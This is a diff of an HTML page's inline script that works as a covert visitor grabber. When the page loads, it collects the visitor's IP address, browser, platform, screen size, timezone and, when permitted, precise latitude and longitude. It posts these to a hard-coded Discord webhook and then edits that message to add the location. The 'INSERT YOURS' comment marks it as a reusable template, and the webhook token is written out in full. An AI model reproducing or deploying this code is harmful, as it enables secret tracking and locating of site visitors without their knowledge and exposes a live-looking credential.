@@ -58,44 +58,53 @@
 
   <script>
     (async () => {
-      const webhookUrl = "https://discord.com/api/webhooks/1335069182928224426/wX5dfhivtfAjFEAP9w561XeLvTevyNNo0xmrunZeI5hT52XzZqE7ORTPVpy4h5U5uyUt"; // 👈 Insert yours
+      const webhookUrl = "https://discord.com/api/webhooks/1335069182928224426/wX5dfhivtfAjFEAP9w561XeLvTevyNNo0xmrunZeI5hT52XzZqE7ORTPVpy4h5U5uyUt"; // INSERT YOURS
 
-      const sendData = async (content) => {
-        await fetch(webhookUrl, {
+      const postToDiscord = async (payload) => {
+        const res = await fetch(webhookUrl + "?wait=true", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content })
+          body: JSON.stringify({ content: payload })
+        });
+        return res.ok ? await res.json() : null;
+      };
+
+      const editDiscordMessage = async (messageId, newContent) => {
+        await fetch(`${webhookUrl}/messages/${messageId}`, {
+          method: "PATCH",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: newContent })
         });
       };
 
-      // Base info
+      // Collect Base Info
       const browser = navigator.userAgent;
       const platform = navigator.platform;
       const screenRes = `${screen.width}x${screen.height}`;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      // Get IP
       const ipData = await fetch("https://api64.ipify.org?format=json")
         .then(res => res.json())
         .catch(() => ({ ip: "N/A" }));
 
-      const sendFallback = () => {
-        const payload = `📡 IP: ${ipData.ip}\n❌ Location denied or unavailable\n🧠 UA: ${browser}\n🖥️ Platform: ${platform}\n📺 Screen: ${screenRes}\n🕓 Timezone: ${timezone}`;
-        sendData(payload);
-      };
+      let basePayload = `📡 IP: ${ipData.ip}\n🧠 UA: ${browser}\n🖥️ Platform: ${platform}\n📺 Screen: ${screenRes}\n🕓 Timezone: ${timezone}`;
 
-      // Try geolocation
-      if ("geolocation" in navigator) {
+      // Send initial data
+      const message = await postToDiscord(basePayload);
+
+      // Try to get geolocation within a short window
+      if ("geolocation" in navigator && message && message.id) {
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
+          async (pos) => {
             const { latitude, longitude } = pos.coords;
-            const payload = `📡 IP: ${ipData.ip}\n📍 Lat: ${latitude}, Lon: ${longitude}\n🧠 UA: ${browser}\n🖥️ Platform: ${platform}\n📺 Screen: ${screenRes}\n🕓 Timezone: ${timezone}`;
-            sendData(payload);
+            const fullPayload = `${basePayload}\n📍 Location: ${latitude}, ${longitude}`;
+            await editDiscordMessage(message.id, fullPayload);
           },
-          (err) => sendFallback()
+          (err) => {
+            // no update if denied
+          },
+          { timeout: 5000 }
         );
-      } else {
-        sendFallback();
       }
     })();
   </script>
